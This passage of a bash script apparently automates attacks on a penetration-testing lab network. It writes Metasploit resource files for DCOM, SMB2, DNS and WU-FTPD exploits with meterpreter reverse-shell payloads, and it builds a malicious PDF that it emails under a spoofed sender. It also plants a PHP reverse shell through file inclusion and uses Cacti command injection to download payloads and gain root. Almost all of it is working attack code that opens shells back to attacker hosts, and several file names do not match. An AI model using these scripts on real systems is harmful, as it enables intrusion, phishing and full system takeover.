    echo -e "use windows/dcerpc/ms03_026_dcom\nset rhost 10.10.13.205\nset lhost 10.10.12.10\nset lport 443\nset payload windows/meterpreter/reverse_tcp\nset DisablePayloadHandler True\nexploit\nsleep 5\nexit" > $msfs/oracle13.rc
    fi
    if [ ! -f $msfs"/oracle14.rc" ];then
    echo -e "use windows/dcerpc/ms03_026_dcom\nset rhost 10.10.15.205\nset lhost 10.10.14.10\nset lport 443\nset payload windows/meterpreter/reverse_tcp\nset DisablePayloadHandler True\nexploit\nsleep 5\nexit" > $msfs/oracle15.rc
    fi

# start oracle exploitation

    if [ $uip == "10.10.11.205" ]; then
    xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Oracle MSF Window" -e $msfc -r $msfs/oracle11.rc
    fi
    if [ $uip == "10.10.13.205" ]; then
    xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Oracle MSF Window" -e $msfc -r $msfs/oracle13.rc
    fi
    if [ $uip == "10.10.15.205" ]; then
    xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Oracle MSF Window" -e $msfc -r $msfs/oracle15.rc
    fi

   else

    if [ `echo $uip | cut -d"." -f4` == "206" ]; then

# start oracle2 resource files


     if [ ! -f $msfs"/oracle211.rc" ];then
      echo -e "use windows/dcerpc/ms03_026_dcom\nset rhost 10.10.11.206\nset lhost 10.10.10.12\nset lport 443\nset payload windows/meterpreter/reverse_tcp\nset DisablePayloadHandler True\nexploit\nsleep 5\nexit" > $msfs/oracle211.rc
     fi
     if [ ! -f $msfs"/oracle213.rc" ];then
      echo -e "use windows/dcerpc/ms03_026_dcom\nset rhost 10.10.13.206\nset lhost 10.10.12.10\nset lport 443\nset payload windows/meterpreter/reverse_tcp\nset DisablePayloadHandler True\nexploit\nsleep 5\nexit" > $msfs/oracle213.rc
     fi
     if [ ! -f $msfs"/oracle214.rc" ];then
      echo -e "use windows/dcerpc/ms03_026_dcom\nset rhost 10.10.15.206\nset lhost 10.10.14.10\nset lport 443\nset payload windows/meterpreter/reverse_tcp\nset DisablePayloadHandler True\nexploit\nsleep 5\nexit" > $msfs/oracle215.rc
     fi
 
# start oracel2 exploitation

     if [ $uip == "10.10.11.206" ]; then
      xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Oracle MSF Window" -e $msfc -r $msfs/oracle211.rc
     fi
     if [ $uip == "10.10.13.206" ]; then
      xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Oracle MSF Window" -e $msfc -r $msfs/oracle213.rc
     fi
     if [ $uip == "10.10.15.206" ]; then
      xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Oracle MSF Window" -e $msfc -r $msfs/oracle215.rc
     fi

    else

# start dirty sanchez "pedro"

     if [ `echo $uip | cut -d"." -f4` == "207" ]; then
      
# checks for hmailserver Jumbo version of john

      if [ "`john | grep "hmailserver" | cut -d"/" -f3`" != "hmailserver" ];then
       mkdir /root/john
       cd /root/john
       wget http://www.openwall.com/john/g/john-1.7.8-jumbo-5.tar.gz
       tar -zxvf john-1.7.8.tar.gz
       cd john-1.7.8-jumbo-5/src
       apt-get -y install libssl-dev
       make clean linux-x86-anything
       cp ../run/* /pentest/passwords/john/
       cd /root
       rm -rf ./john
      fi

# make the directory to store the pdf's in

      if [ ! -d $msfp/pedro1 ];then
       mkdir $msfp/pedro1
      fi
      if [ ! -d $msfp/pedro2 ];then
       mkdir $msfp/pedro2
      fi
      if [ ! -d $msfp/pedro3 ];then
       mkdir $msfp/pedro3
      fi
# produce the recourse files for msf pdf creation

      if [ ! -f $msfs"/pedro11.rc" ];then
       echo -e "use exploit/windows/fileformat/adobe_utilprintf\nset FILENAME /pentest/exploits/framework3/pedro1/report.pdf\nset lhost 10.10.10.12\nset lport 443\nset payload windows/meterpreter/reverse_tcp\nset DisablePayloadHandler True\nexploit\nsleep 25\nexit" > $msfs/pedro11.rc
      fi
      if [ ! -f $msfs"/pedro13.rc" ];then
       echo -e "use exploit/windows/fileformat/adobe_utilprintf\nset FILENAME /pentest/exploits/framework3/pedro2/report.pdf\nset lhost 10.10.12.10\nset lport 443\nset payload windows/meterpreter/reverse_tcp\nset DisablePayloadHandler True\nexploit\nsleep 25\nexit" > $msfs/pedro13.rc
      fi
      if [ ! -f $msfs"/pedro15.rc" ];then
       echo -e "use exploit/windows/fileformat/adobe_utilprintf\nset FILENAME /pentest/exploits/framework3/pedro3/report.pdf\nset lhost 10.10.14.10\nset lport 443\nset payload windows/meterpreter/reverse_tcp\nset DisablePayloadHandler True\nexploit\nsleep 25\nexit" > $msfs/pedro15.rc
      fi

# make the emails to send to pedro spoofed from jeff

      if [ $uip == "10.10.11.207" ]; then
       if [ ! -f $msfp/pedro1/report.pdf ]; then
        xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Getting dirty with it...Pedro" -e $msfc -r $msfs/pedro11.rc
       fi
       xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Sending the nasty gram to pedro" -e sendEmail -s 10.10.11.229 -xu jeff@thinc.local -xp password -f jeff@thinc.local -t pedro@thinc.local -u report -m 'It is not meterpreter I swear....' -a /pentest/exploits/framework3/pedro1/report.pdf
      fi
      if [ $uip == "10.10.13.207" ]; then
       if [ ! -f $msfp/pedro2/report.pdf ]; then
        xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Getting dirty with it...Pedro" -e $msfc -r $msfs/pedro13.rc
       fi
       xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Sending the nasty gram to pedro" -e sendEmail -s 10.10.13.229 -xu jeff@thinc.local -xp password -f jeff@thinc.local -t pedro@thinc.local -u report -m 'It is not meterpreter I swear....' -a /pentest/exploits/framework3/pedro2/report.pdf
      fi
      if [ $uip == "10.10.15.207" ]; then
       if [ ! -f $msfp/pedro3/report.pdf ]; then
        xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Getting dirty with it...Pedro" -e $msfc -r $msfs/pedro15.rc
       fi
       xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Sending the nasty gram to pedro" -e sendEmail -s 10.10.15.229 -xu jeff@thinc.local -xp password -f jeff@thinc.local -t pedro@thinc.local -u report -m 'It is not meterpreter I swear....' -a /pentest/exploits/framework3/pedro3/report.pdf
      fi
 
     else

# start phoenix

      if [ `echo $uip | cut -d"." -f4` == "208" ]; then
  
# make phoenix dir and web dir for shell

       if [ ! -d /pentest/exploits/framework3/phoenix/ ]; then
        mkdir /pentest/exploits/framework3/phoenix/
       fi
       if [ ! -d /var/www/phoenix/ ]; then
        mkdir /var/www/phoenix/
       fi

# checks for pentest monkey reverse php shell

       if [ ! -f /pentest/exploits/framework3/phoenix/php-rev.tar.gz ]; then
        wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz -O /pentest/exploits/framework3/phoenix/php-rev.tar.gz
        tar /pentest/exploits/framework3/phoenix/php-rev.tar.gz
       fi

#makes the reverse shell php for phoenix

       if [ ! -f /pentest/exploits/framework3/phoenix/phoenix11.php ]; then
        cd /pentest/exploits/framework3/phoenix/php-reverse-shell-1.0/
        cat php-reverse-shell.php | sed -r "s/(ip = )(.*)/\1'10.10.10.12';/g" | sed -r "s/(port = )(.*)/\1 80;/g" > /pentest/exploits/framework3/phoenix/phoenix11.php
        cp /pentest/exploits/framework3/phoenix/phoenix11.php /var/www/phoenix/phoenix11.php
       fi
       if [ ! -f /pentest/exploits/framework3/phoenix/phoenix13.php ]; then
        cd /pentest/exploits/framework3/phoenix/php-reverse-shell-1.0/
        cat php-reverse-shell.php | sed -r "s/(ip = )(.*)/\1'10.10.12.10';/g" | sed -r "s/(port = )(.*)/\1 80;/g" > /pentest/exploits/framework3/phoenix/phoenix13.php
        cp /pentest/exploits/framework3/phoenix/phoenix13.php /var/www/phoenix/phoenix13.php
       fi 
       if [ ! -f /pentest/exploits/framework3/phoenix/phoenix15.php ]; then
        cd /pentest/exploits/framework3/phoenix/php-reverse-shell-1.0/
        cat /pentest/exploits/framework3/ghost/php-reverse-shell-1.0/php-reverse-shell.php | sed -r "s/(ip = )(.*)/\1'10.10.14.10';/g" | sed -r "s/(port = )(.*)/\1 80;/g" > /pentest/exploits/framework3/phoenix/phoenix15.php
        cp /pentest/exploits/framework3/phoenix/phoenix15.php /var/www/poenix/phoenix13.php
       fi        

# start phoenix exploitation process

       if [ $uip == "10.10.11.208" ]; then

        apache2ctl stop
        a2enmod php5
        apache2ctl start
        sleep 5
        xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "inSINeration" -e nc -l -v -p 80 &
        sleep 5
        xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Resurrection" -e wget http://10.10.11.208/internal/advanced_comment_system/index.php?ACS_path=http://10.10.10.12/phoenix/phoenix11.php? && rm -rf ./index.php\?ACS_path\=http\:%2F%2F10.10.10.12%2Fphoenix%2Fphoenix11.php\?
        sleep 10
        killall -9 wget
        ps -A xf | grep "nc -l -v -p 8080" | grep -v grep | tr -s " " | cut -d" " -f2 | xargs kill -9
       fi

      else 

# start cacti """ takes about 4 min., to get root on this machine"""

       if [ `echo $uip | cut -d"." -f4` == "209" ]; then
   
# produce local root exploit to web dir

        if [ ! -f /var/www/cacti/cactiroot11.sh ]; then
         cp /pentest/exploits/exploitdb/platforms/linux/local/2011.sh /var/www/cacti/cactiroot11.sh
        fi
        if [ ! -f /var/www/cacti/cactiroot13.sh ]; then
         cp /pentest/exploits/exploitdb/platforms/linux/local/2011.sh /var/www/cacti/cactiroot13.sh
        fi
        if [ ! -f /var/www/cacti/cactiroot15.sh ]; then
         cp /pentest/exploits/exploitdb/platforms/linux/local/2011.sh /var/www/cacti/cactiroot15.sh
        fi

# produce web shell to get root 

        if [ ! -f /var/www/cacti/cacti11 ]; then
         msfpayload linux/x86/shell_reverse_tcp LHOST=10.10.10.12 LPORT=8080 X > /var/www/cacti/cacti11
        fi
        if [ ! -f /var/www/cacti/cacti13 ]; then
         msfpayload linux/x86/shell_reverse_tcp LHOST=10.10.12.10 LPORT=8080 X > /var/www/cacti/cacti13
        fi
        if [ ! -f /var/www/cacti/cacti15 ]; then
         msfpayload linux/x86/shell_reverse_tcp LHOST=10.10.15.10 LPORT=8080 X > /var/www/cacti/cacti15
        fi

# check ensure apache is operational with php5

       if [ "`netstat -ant | tr -s " " | grep "0.0.0.0:80" | cut -d" " -f6`" == "LISTEN" ]; then

        xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Stop Re-enable PHP5 and start Apache" -e 'killall -9 apach2 && a2enmod php5 && apache2ctl start'
       else
        xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Re-enable PHP5 and start Apache" -e 'a2enmod php5 && apache2ctl start'
       fi
# start attack on cacti

        if [ $uip == "10.10.11.209" ]; then
         xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Cacti PHP CMD Injections1" -e 'php /pentest/exploits/exploitdb/platforms/php/webapps/3029.php 10.10.11.209  /cacti/ wget http://10.10.10.12/cacti/cacti11 -O /tmp/cacti11 && php /pentest/exploits/exploitdb/platforms/php/webapps/3029.php 10.10.11.209  /cacti/ wget http://10.10.10.12/cacti/nc -O /tmp/nc && php /pentest/exploits/exploitdb/platforms/php/webapps/3029.php 10.10.11.209  /cacti/ chmod 755 /tmp/nc && php /pentest/exploits/exploitdb/platforms/php/webapps/3029.php 10.10.11.209  /cacti/ chmod 755 /tmp/cacti11' &
         xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Cacti web user Shell" -e 'echo -e "wget http://10.10.10.12/cacti/cactiroot11.sh -O /tmp/cactiroot11.sh\nsleep 5\nchmod 755 /tmp/cactiroot11.sh\n/tmp/cactiroot11.sh" | nc -lvp 8080' &
         sleep 30
         xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Cacti PHP CMD Injections2" -e php /pentest/exploits/exploitdb/platforms/php/webapps/3029.php 10.10.11.209  /cacti/ /tmp/cacti11 &
         echo -e "\n\n\t\t[*] Taking a 300 second nap...." 
         sleep 300s
         xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Cacti root user" -e 'echo -e "whoami\nifconfig" | nc -lvp 8081' &
         xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Cacti root user PHP CMD Injections" -e php /pentest/exploits/exploitdb/platforms/php/webapps/3029.php 10.10.11.209  /cacti/ /tmp/nc 10.10.10.12 8081 -e /tmp/s  &
         sleep 120s
         ps -A xf | grep  "nc -lvp 8080" | grep xterm | grep -v "grep" | cut -d" " -f1 | xargs kill -9
         ps -A xf | grep "root user PHP" | grep xterm | grep -v "grep" | cut -d" " -f1 | xargs kill -9
        fi

        if [ $uip == "10.10.13.209" ]; then
         xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Cacti PHP CMD Injections1" -e 'php /pentest/exploits/exploitdb/platforms/php/webapps/3029.php 10.10.13.209  /cacti/ wget http://10.10.12.10/cacti/cacti13 -O /tmp/cacti13 && php /pentest/exploits/exploitdb/platforms/php/webapps/3029.php 10.10.13.209  /cacti/ wget http://10.10.12.10/cacti/nc -O /tmp/nc && php /pentest/exploits/exploitdb/platforms/php/webapps/3029.php 10.10.13.209  /cacti/ chmod 755 /tmp/nc && php /pentest/exploits/exploitdb/platforms/php/webapps/3029.php 10.10.13.209  /cacti/ chmod 755 /tmp/cacti13' &
         xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Cacti web user Shell" -e 'echo -e "wget http://10.10.12.10/cacti/cactiroot13.sh -O /tmp/cactiroot13.sh\nsleep 5\nchmod 755 /tmp/cactiroot13.sh\n/tmp/cactiroot13.sh\nsleep 300s\nexit" | nc -lvp 8080' &
         sleep 30
         xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Cacti PHP CMD Injections2" -e php /pentest/exploits/exploitdb/platforms/php/webapps/3029.php 10.10.13.209  /cacti/ /tmp/cacti13 &
         echo -e "\n\n\t\t[*] Taking a 300 second nap...." 
         sleep 300s
         xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Cacti root user" -e 'echo -e "whoami\nifconfig" | nc -lvp 8081' &
         xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Cacti root user PHP CMD Injections" -e php /pentest/exploits/exploitdb/platforms/php/webapps/3029.php 10.10.13.209  /cacti/ /tmp/nc 10.10.12.10 8081 -e /tmp/s &
         sleep 120
         ps -A xf | grep  "nc -lvp 8080" | grep xterm | grep -v "grep" | cut -d" " -f1 | xargs kill -9
         ps -A xf | grep "root user PHP" | grep xterm | grep -v "grep" | cut -d" " -f1 | xargs kill -9
        fi

        if [ $uip == "10.10.15.209" ]; then
         xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Cacti web user PHP CMD Injections1" -e 'php /pentest/exploits/exploitdb/platforms/php/webapps/3029.php 10.10.15.209  /cacti/ wget http://10.10.14.10/cacti/cacti11 -O /tmp/cacti15 && php /pentest/exploits/exploitdb/platforms/php/webapps/3029.php 10.10.15.209  /cacti/ wget http://10.10.14.10/cacti/nc -O /tmp/nc && php /pentest/exploits/exploitdb/platforms/php/webapps/3029.php 10.10.15.209  /cacti/ chmod 755 /tmp/nc && php /pentest/exploits/exploitdb/platforms/php/webapps/3029.php 10.10.15.209  /cacti/ chmod 755 /tmp/cacti15' &
         xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Cacti web user" -e 'echo -e "wget http://10.10.14.10/cacti/cactiroot15.sh -O /tmp/cactiroot15.sh\nsleep 5\nchmod 755 /tmp/cactiroot15.sh\n/tmp/cactiroot15.sh\nsleep 300s\nexit" | nc -lvp 8080' &
         sleep 30
         xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Cacti web user PHP CMD Injections2" -e php /pentest/exploits/exploitdb/platforms/php/webapps/3029.php 10.10.15.209  /cacti/ /tmp/cacti15 &
         echo -e "\n\n\t\t[*] Taking a 300 second nap...." 
         sleep 300s
         xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Cacti root user" -e 'echo -e "whoami\nifconfig" | nc -lvp 8081' &
         xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Cacti root user PHP CMD Injections" -e php /pentest/exploits/exploitdb/platforms/php/webapps/3029.php 10.10.15.209  /cacti/ /tmp/nc 10.10.14.10 8081 -e /tmp/s &
         sleep 120
         ps -A xf | grep  "nc -lvp 8080" | grep xterm | grep -v "grep" |cut -d" " -f1 | xargs kill -9
         ps -A xf | grep "root user PHP" | grep xterm | grep -v "grep" | cut -d" " -f1 | xargs kill -9
        fi

        else

# start trixbox root shell from SOME 0day 

         if [ `echo $uip | cut -d"." -f4` == "211" ]; then

# start trixbox exploitation

          if [ $uip == "10.10.11.211" ]; then
           xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Trixbox python script" -e python /pentest/exploits/exploitdb/platforms/linux/remote/6045.py 10.10.11.211 80 10.10.10.12 8082 &
           xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Trixbox root shell" -e nc -lvp 8082 &
           sleep 45
           ps -A xf | grep -v grep | grep "6045.py" | grep xterm | cut -d" " -f1 | xargs kill -9
          fi

          if [ $uip == "10.10.13.211" ]; then
           xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Trixbox python script" -e python /pentest/exploits/exploitdb/platforms/linux/remote/6045.py 10.10.13.211 80 10.10.12.10 8082 &
           xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Trixbox root shell" -e nc -lvp 8082 &
           sleep 45
           ps -A xf | grep -v grep | grep "6045.py" | grep xterm | cut -d" " -f1 | xargs kill -9
          fi

          if [ $uip == "10.10.15.211" ]; then
           xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Trixbox python script" -e python /pentest/exploits/exploitdb/platforms/linux/remote/6045.py 10.10.15.211 80 10.10.14.10 8082 &
           xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Trixbox root shell" -e nc -lvp 8082 &
           sleep 45
           ps -A xf | grep -v grep | grep "6045.py" | grep xterm | cut -d" " -f1 | xargs kill -9
          fi

         else

          if [ `echo $uip | cut -d"." -f4` == "213" ]; then

# Start MSFBOX1

           if [ $uip == "10.10.11.213" ]; then
            echo -e "MSFPRO BOX\nu:SOMEPWD p:PASSWORD\nhttps:\\localhost:3790 u:SOMEPWD p: SOMEPASSWORD\n\n\tto get root: sudo su"
           fi
           if [ $uip == "10.10.13.213" ]; then
            echo -e "MSFPRO BOX\nu:SOMEPWD p:PASSWORD\nhttps:\\localhost:3790 u:SOMEPWD p: SOMEPASSWORD\n\n\tto get root: sudo su"
           fi
           if [ $uip == "10.10.15.213" ]; then
            echo -e "MSFPRO BOX\nu:SOMEPWD p:PASSWORD!!\nhttps:\\localhost:3790 u:SOMEPWD p: SOMEPASSWORD\n\n\tto get root: sudo su"
           fi
          else

# Start MSFBOX2

           if [ `echo $uip | cut -d"." -f4` == "214" ]; then
            if [ $uip == "10.10.11.214" ]; then
            echo -e "MSFPRO BOX\nu:SOMEPWD p:PASSWORD!!\nhttps:\\localhost:3790 u:SOMEPWD p: SOMEPASSWORD\n\n\tto get root: sudo su"
            fi
            if [ $uip == "10.10.13.214" ]; then
            echo -e "MSFPRO BOX\nu:SOMEPWD p:PASSWORD!!\nhttps:\\localhost:3790 u:SOMEPWD p: SOMEPASSWORD\n\n\tto get root: sudo su"
            fi
            if [ $uip == "10.10.15.214" ]; then
            echo -e "MSFPRO BOX\nu:SOMEPWD p:PASSWORD!!\nhttps:\\localhost:3790 u:SOMEPWD p: SOMEPASSWORD\n\n\tto get root: sudo su"
            fi
           else

# start Redhat SMB exploit

            if [ `echo $uip | cut -d"." -f4` == "215" ]; then
 
             if [ $uip == "10.10.11.215" ]; then
             xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Redhat SMB 2.2 RRBO ;)" -e perl /pentest/exploits/exploitdb/platforms/linux/remote/7.pl -t linx86 -H 10.10.10.12 -h 10.10.11.215 &
             fi
             if [ $uip == "10.10.13.215" ]; then
             xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Redhat SMB 2.2 RRBO ;)" -e perl /pentest/exploits/exploitdb/platforms/linux/remote/7.pl -t linx86 -H 10.10.12.10 -h 10.10.13.215 &
             fi
             if [ $uip == "10.10.15.215" ]; then
             xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Redhat SMB 2.2 RRBO ;)" -e perl /pentest/exploits/exploitdb/platforms/linux/remote/7.pl -t linx86 -H 10.10.14.10 -h 10.10.15.215 &
             fi

            else

# start redhat9 

             if [ `echo $uip | cut -d"." -f4` == "217" ]; then

# make the resource files for redhat9

              if [ ! -f  $msfs/redhat911.rc ];then
               echo -e "$msfs/redhat9.rc\nuse exploit/multi/ftp/wuftpd_site_exec_format\nset rhost 10.10.11.217\nset lhost 10.10.10.12\nset lport 443\nset payload linux/x86/meterpreter/reverse_tcp\nset disablepayloadhandler true\nexploit\nexit\n" > $msfs/redhat911.rc
              fi
              if [ ! -f  $msfs/redhat913.rc ];then
               echo -e "$msfs/redhat9.rc\nuse exploit/multi/ftp/wuftpd_site_exec_format\nset rhost 10.10.13.217\nset lhost 10.10.12.10\nset lport 443\nset payload linux/x86/meterpreter/reverse_tcp\nset disablepayloadhandler true\nexploit\nexit\n" > $msfs/redhat915.rc
              fi
              if [ ! -f  $msfs/redhat915.rc ];then
               echo -e "$msfs/redhat9.rc\nuse exploit/multi/ftp/wuftpd_site_exec_format\nset rhost 10.10.15.217\nset lhost 10.10.14.10\nset lport 443\nset payload linux/x86/meterpreter/reverse_tcp\nset disablepayloadhandler true\nexploit\nexit\n" > $msfs/redhat915.rc
              fi

# start the exploitation process for redhat9

              if [ $uip == "10.10.15.217" ]; then
               xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Redhat 9 exploit" -e $msfc -r $msfs/redhat911.rc
              fi              
              if [ $uip == "10.10.13.217" ]; then
               xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Redhat 9 exploit" -e $msfc -r $msfs/redhat913.rc
              fi
              if [ $uip == "10.10.15.217" ]; then
               xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Redhat 9 exploit" -e $msfc -r $msfs/redhat915.rc
              fi

             else

              if [ `echo $uip | cut -d"." -f4` == "220" ]; then

# start master recourse file creation

               if [ ! -f  $msfs/master11.rc ];then
                echo -e "use exploit/windows/smb/ms09_050_smb2_negotiate_func_index" > $msfs/master11.rc
                echo -e "set rhost 10.10.11.220">> $msfs/master11.rc
                echo -e "set lhost 10.10.10.12">> $msfs/master11.rc
                echo -e "set lport 443">> $msfs/master11.rc
                echo -e "set payload windows/meterpreter/reverse_tcp">> $msfs/master11.rc
                echo -e "set DisablePayloadHandler True">> $msfs/master11.rc
                echo -e "exploit">> $msfs/master11.rc
                echo -e "exit" >> $msfs/master11.rc
               fi
               if [ ! -f  $msfs/master13.rc ];then
                echo -e "use exploit/windows/smb/ms09_050_smb2_negotiate_func_index" > $msfs/master13.rc
                echo -e "set rhost 10.10.13.220" >> $msfs/master13.rc
                echo -e "set lhost 10.10.10.12" >> $msfs/master13.rc
                echo -e "set lport 443" >> $msfs/master13.rc
                echo -e "set payload windows/meterpreter/reverse_tcp" >> $msfs/master13.rc
                echo -e "set DisablePayloadHandler True" >> $msfs/master13.rc
                echo -e "exploit" >> $msfs/master13.rc
                echo -e "exit" >> $msfs/master13.rc
               fi
               if [ ! -f  $msfs/master15.rc ];then
                echo -e "use exploit/windows/smb/ms09_050_smb2_negotiate_func_index" > $msfs/master15.rc
                echo -e "set rhost 10.10.15.220" >> $msfs/master15.rc
                echo -e "set lhost 10.10.14.10" >> $msfs/master15.rc
                echo -e "set lport 443" >> $msfs/master15.rc
                echo -e "set payload windows/meterpreter/reverse_tcp" >> $msfs/master15.rc
                echo -e "set DisablePayloadHandler True" >> $msfs/master15.rc
                echo -e "exploit" >> $msfs/master15.rc
                echo -e "exit" >> $msfs/master15.rc
               fi

# start master exploitation process

               if [ $uip == "10.10.11.220" ]; then
                $msfc -r $msfs/master11.rc
               fi
               if [ $uip == "10.10.13.220" ]; then
                $msfc -r $msfs/master13.rc
               fi
               if [ $uip == "10.10.15.220" ]; then
                $msfc -r $msfs/master15.rc
               fi

              else

# start slave 

               if [ `echo $uip | cut -d"." -f4` == "221" ]; then
 
# make slave recourse files as needed

                if [ ! -f  $msfs/master11.rc ];then
                 echo -e "use exploit/windows/dcerpc/ms07_029_msdns_zonename" > $msfs/slave11.rc
                 echo -e "set rhost 10.10.11.221" >> $msfs/slave11.rc
                 echo -e "set lhost 10.10.10.12" >> $msfs/slave11.rc
                 echo -e "set lport 443" >> $msfs/slave11.rc
                 echo -e "set payload windows/meterpreter/reverse_tcp" >> $msfs/slave11.rc
                 echo -e "set DisablePayloadHandler True" >> $msfs/slave11.rc
                 echo -e "exploit" >> $msfs/slave11.rc
                 echo -e "exit" >> $msfs/slave11.rc
                fi
                if [ ! -f  $msfs/master13.rc ];then
                 echo -e "use exploit/windows/dcerpc/ms07_029_msdns_zonename" > $msfs/slave13.rc
                 echo -e "set rhost 10.10.13.221" >> $msfs/slave13.rc
                 echo -e "set lhost 10.10.12.10" >> $msfs/slave13.rc
                 echo -e "set lport 443" >> $msfs/slave13.rc
                 echo -e "set payload windows/meterpreter/reverse_tcp" >> $msfs/slave13.rc
                 echo -e "set DisablePayloadHandler True" >> $msfs/slave13.rc
                 echo -e "exploit" >> $msfs/slave13.rc
                 echo -e "exit" >> $msfs/slave13.rc
                fi
                if [ ! -f  $msfs/master15.rc ];then
                 echo -e "use exploit/windows/dcerpc/ms07_029_msdns_zonename" > $msfs/slave15.rc
                 echo -e "set rhost 10.10.15.221" >> $msfs/slave15.rc
                 echo -e "set lhost 10.10.14.10" >> $msfs/slave15.rc
                 echo -e "set lport 443" >> $msfs/slave15.rc
                 echo -e "set payload windows/meterpreter/reverse_tcp" >> $msfs/slave15.rc
                 echo -e "set DisablePayloadHandler True" >> $msfs/slave15.rc
                 echo -e "exploit" >> $msfs/slave15.rc
                 echo -e "exit" >> $msfs/slave15.rc
                fi

# start slave exploitation process

                if [ $uip == "10.10.11.221" ]; then
                 $msfc -r $msfs/slave15.rc
                fi
                if [ $uip == "10.10.13.221" ]; then
                 $msfc -r $msfs/slave15.rc
                fi
                if [ $uip == "10.10.15.221" ]; then
                 $msfc -r $msfs/slave15.rc
                fi

               else

# start mail man

                if [ `echo $uip | cut -d"." -f4` == "222" ]; then

# start mail man exploitation

                 if [ $uip == "10.10.11.222" ]; then
